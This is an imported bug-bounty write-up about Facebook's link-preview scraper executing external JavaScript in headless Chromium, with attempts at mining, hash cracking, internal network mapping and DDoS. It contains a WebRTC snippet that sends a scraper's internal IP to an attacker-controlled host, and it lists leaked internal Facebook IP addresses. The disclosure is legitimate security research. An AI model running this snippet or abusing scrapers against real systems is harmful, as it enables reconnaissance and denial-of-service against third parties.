---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-06-29_the-army-of-the-headless-browsers.md
original_filename: 2022-06-29_the-army-of-the-headless-browsers.md
title: The Army Of The Headless Browsers
category: documents
detected_topics:
- ssrf
- command-injection
- automation-abuse
- business-logic
- api-security
- cloud-security
tags:
- imported
- documents
- ssrf
- command-injection
- automation-abuse
- business-logic
- api-security
- cloud-security
language: en
raw_sha256: cc81adc0c3b6660d80f2e4e67d63285f42e36ed0abd9c00f60738aab1f2b3c7a
text_sha256: 0b663a41c0a003fce0c983c4602e1eaf7b24648d486e60601f143fd978fd19f1
ingested_at: '2026-06-28T07:32:12Z'
sensitivity: unknown
redactions_applied: false
---

# The Army Of The Headless Browsers

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-06-29_the-army-of-the-headless-browsers.md
- Source Type: markdown
- Detected Topics: ssrf, command-injection, automation-abuse, business-logic, api-security, cloud-security
- Ingested At: 2026-06-28T07:32:12Z
- Redactions Applied: False
- Raw SHA256: `cc81adc0c3b6660d80f2e4e67d63285f42e36ed0abd9c00f60738aab1f2b3c7a`
- Text SHA256: `0b663a41c0a003fce0c983c4602e1eaf7b24648d486e60601f143fd978fd19f1`


## Content

---
title: "The Army Of The Headless Browsers"
url: "https://medium.com/@TheKomodoconsulting/the-army-of-the-headless-browsers-11aad3f7ee81"
authors: ["Komodo Cyber Consulting (@Komodosec)"]
programs: ["Meta / Facebook"]
bugs: ["DDoS", "Logic flaw"]
publication_date: "2022-06-29"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2502
scraped_via: "browseros"
---

# The Army Of The Headless Browsers

The Army Of The Headless Browsers
Komodo Consulting
Follow
5 min read
·
Jun 29, 2022

2

Press enter or click to view image in full size

How Facebook infrastructure can be used to perform DDoS.

As a penetration tester, examining proprietary applications and repeatedly finding the same technical issues, can become a tad mind-numbing at the best of times. This is why I absolutely love security bug bounties — they always seem to challenge my inner-hacker, make me dig deeper, and find vulnerabilities in features that were already examined by top-notch security researchers. This was the case with Facebook, which I found allowed hackers to launch DDoS attacks on 3rd parties via their infrastructure using their “army of headless browsers.”

Initial observation

When pasting a URL in Facebook, the application fetches a preview of the page and shows its metadata to the viewer.

One day, I wanted to publish a simple post containing a link.

When I pasted the link, the metadata window (displaying the page’s title, description, and thumbnail image) informed me that I was using an ad-blocker. Well I was most certainly not! I love my ads just the way they are — intrusive and annoying. Something smelled fishy, so I started to do some digging.

When analyzing my own HTTP traffic, I realized that I didn’t send HTTP requests to the pasted URL. So, something fetched that URL for me and it wasn’t my browser. Some quick AWS tricks and I had a web-server listening to the internet on port 80.

Let’s just say my web server is available at the address “evilmoti-dot- com”. Pasting the URL http:/-evilmoti.com/hello.html in a Facebook “make post” box will result in its scraper sending an HTTP GET request to fetch the content of my potentially malicious page. So far, nothing special about that — after all, every major social network scraper shows a preview of the page’s content.

But what if it does more than just fetch static HTML content? What if it runs JavaScript? Will I now be able to execute malicious JavaScript on Facebook’s infrastructure? Until recently, the answer was a resounding “yes!”. Facebook would run my JavaScript, and, in their opinion — this was a feature, not a bug!

Exploit for fun and (no) profit

So now that I could execute arbitrary JS on FB’s browsers. My next question was: what can a malicious JavaScript actually do in an unknown environment? JavaScript is an extremely powerful tool for developers. New features are constantly being developed that allow more and more functionality to the language. The first attacks which came to my mind were:

Internal network scanning
Crypto currency mining
DDoS attacks via internal & external infrastructures
Distributed hash cracking

My first step was trying to understand what we’re working with and fingerprinting the browser and OS technology is a crucial part of the process. There are some great open source libraries for this purpose that usually use various features in the HTML5 specification and browser APIs, such as Canvas.

I chose to use fingerprintjs. I ran the fingerprinting script on the browsers and came to the conclusion that Facebook was using a headless version of the chromium browser that used to run inside some type of strong container with 8 CPU cores.

Mine me some money! Please?

Get Komodo Consulting’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

By now you are probably thinking: more computing power = more crypto?

Wrong. I’ve tried importing Coinhive’s crypto-mining library and ran it against the browsers — that didn’t seem to work. I don’t know if this is intentional, but the browsers kept dying some 30 seconds after initiated, not letting the CPU juices kick in. Therefore, having a Facebook cloud-distributed-crypto-mining-hash-cracking monster was not feasible.

Next, I tried to crack MD5 hashes as a POC, using a type of Web-Worker-based password cracker. While being able to crack very simple values, such as “123456”, when it came to more complex values, the browsers just kept dying without returning results. That was probably due to the browser’s short life span.

Mapping the internal network

An interesting feature which the chromium browsers do support, is the use of “WebRTC.” This is a suite of protocols designed to allow browsers to perform Real Time Communication between each other. One of the features in the WebRTC browser API is the ability to discover the browser machine’s internal IP address in the network.

The following is a code snippet that extracts the browser’s internal IP address in the local network:

<div id=”test”> <form id=”tempform” action=”http:/-attacker-controlled-site.ddns.net/internal-ip.php” method=”POST”> <input id=”tempinput” name=”data” type=”text” value=”temp-value” /> <input type=”submit” value=”clickme!” /> </form> </div> <script> window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection; var pc = new RTCPeerConnection({iceServers:[]}), noop = function(){}; pc.createDataChannel(“”); pc.createOffer(pc.setLocalDescription.bind(pc), noop); pc.onicecandidate = function(ice){ if(!ice || !ice.candidate || !ice.candidate.candidate) return; var myIP = /([0–9]{1,3}(.[0–9]{1,3}){3}|[a-f0–9]{1,4}(:[a-f0–9]{1,4}){7})/.exec(ice.candidate.candidate)[1]; var icedata = ice.candidate.candidate; pc.onicecandidate = noop; document.getElementById(“tempinput”).value = myIP; document.getElementById(“tempform”).submit(); }; </script>

I ran this piece of code against FB’s internal browsers and extracted a list of some internal IPs used by Facebook’s scrapers:

10.102.251.73 10.106.157.91 10.114.96.75 10.144.111.29 10.16.104.71 10.16.124.25 10.16.203.63 10.200.163.55 10.224.16.47 10.228.151.89 10.228.192.79 10.228.209.75 10.229.13.71 10.229.88.95 10.229.93.81 10.242.159.75 10.242.161.73 10.242.175.47 10.242.177.45 10.242.177.61 10.242.22.67 10.242.33.95 10.242.45.57 10.242.7.41 10.242.8.23 10.247.28.79 10.247.78.41 10.62.100.95 10.62.121.73 10.62.15.97 10.88.156.47 2401:db00:1010:7004:face:0:45:0 2401:db00:1010:7067:face:0:15:0 2401:db00:11:b12d:face:0:d:0 2401:db00:2120:10d9:face:0:27:0 2401:db00:2120:114a:face:0:2b:0 2401:db00:2120:116a:face:0:3b:0 2401:db00:2120:116a:face:0:3b:0 2401:db00:21:108e:face:0:39:0 2401:db00:3020:522f:face:0:1f:0 2401:db00:3020:b1e5:face:0:f:0 (This is just a sample — the full list is quite large.)

As you can see, Facebook’s network engineers have a healthy sense of humor and made sure to include the word “face” in their IPv6 range.

Running DDoS from within Facebook

The most interesting part though was to attack 3rd parties via Facebook’s infrastructure. Having an army of browsers send massive amounts of data to any website, is a major threat to the internet — with Facebook’s infrastructure and bandwidth, you have unlimited power.

Press enter or click to view image in full size

I launched a quick POC against my own web server hosted with my cloud environment. Examining the network traffic reaching my server, I noticed a peak in the server’s upload rate, making it unresponsive for a moment. At this point I was convinced that this mechanism was exploitable.

“Thanks, but no thanks!”

I contacted Facebook on March 2017 and sent them a report detailing the issue. Facebook did not consider this a security vulnerability, rather a feature. Nevertheless, they have since changed the way their scraper works. As of today, it appears that they no longer run external JavaScript through the post publishing scraping mechanism.

The recent “Spectre” vulnerability suggests additional attack vectors that potentially could have allowed me to access sensitive data on the operating system via malicious JavaScript. Even without it, having browsers running potentially malicious external code in your data center is a dangerous practice and should be treated with care. Malicious input can be executed in all sorts of ways, and the attackers are getting more creative on a daily basis.

Further research is still required to fully understand the potential impact of such a mechanism (creative ideas are always welcomed). I will keep digging when new leads or ideas come to my mind.

Moti Harmats, Head of Professional Services

Source: https://www.komodosec.com/
